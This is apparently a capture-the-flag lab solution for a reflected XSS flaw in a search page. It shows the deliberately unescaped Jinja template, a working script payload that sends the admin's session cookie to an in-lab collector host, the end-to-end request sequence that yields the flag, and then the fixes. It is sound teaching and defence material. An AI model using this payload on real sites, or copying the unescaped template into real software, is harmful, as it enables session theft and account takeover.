# Solution — Reflected XSS in Search Results

## The sink

`GET /` renders the search results with an autoescape-**disabled** Jinja
environment:

```python
_unsafe_env = Environment(autoescape=False)   # the deliberate flaw
PAGE = _unsafe_env.from_string("... <h2>Results for {{ q }}</h2> ...")
```

So `?q=` is interpolated into HTML with no encoding — `<`, `>`, `"` all pass
through. Confirm:

```
GET /?q=<b>x</b>      →  ...<h2>Results for <b>x</b></h2>...   (bold, not literal)
```

## The delivery model

You cannot read the admin's cookie from your own browser (same-origin policy
scopes `document.cookie` to whoever loads the page). You need the **admin's**
browser to execute your JavaScript. The `POST /report` feature is exactly that
capability: it queues a same-site path, and the admin bot visits it every ~2s
while logged in. The bot's session cookie is **not** `HttpOnly`, so JS can read
it.

## The payload

```html
<script>
  new Image().src = 'http://collector:9000/report?c=' + encodeURIComponent(document.cookie);
</script>
```

`new Image().src = …` fires a cross-origin GET with no CORS restriction (image
loads are not subject to the same-origin read barrier — the request still goes
out, which is all we need). `collector:9000` is the in-lab OOB listener.

## End-to-end

```
POST /report      {"url":"/?q=<script>new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)</script>"}
# wait for the bot to visit (~2s)
GET  /oob/received       # app-side proxy to the collector; find /report?c=session=<32hex>
POST /solve       {"c":"<32hex>"}     →  FLAG{...}
```

`tests/exploit.py` automates this: submit → poll `/oob/received` → parse the
32-hex session → `/solve`.

## Why the containment holds

- The collector and admin bot live on a `backend` network with `internal: true`
  — **no route off the host**. The stolen cookie can reach the in-lab collector
  but never the internet, so the lab can ship a real cookie-exfil primitive at
  `risk: low`.
- The admin bot's cookie-minting endpoint (`/internal/bot-login`) is firewalled
  to the backend subnet **and** gated by a `BOT_KEY`, so a lab visitor on the
  public side cannot request the admin cookie via `Set-Cookie` and skip the XSS.
- `/internal/queue` is likewise backend-only. The intended reflected-XSS path is
  the _only_ way to obtain the admin session.

## The two fixes (independent — either one breaks the exploit)

1. **Contextual output encoding.** Leave Jinja autoescape on (the default), or
   HTML-encode `q` before insertion. `<script>` becomes `&lt;script&gt;` — inert
   text. This kills the injection at the source.
2. **`HttpOnly` session cookie.** `Set-Cookie: session=…; HttpOnly` makes
   `document.cookie` unable to read it, so even a successful script injection
   cannot steal the session. Defence in depth: fix both.

`SameSite` and a strict `Content-Security-Policy` (no inline script) would each
also have blocked this specific payload; CSP is explored in later labs.
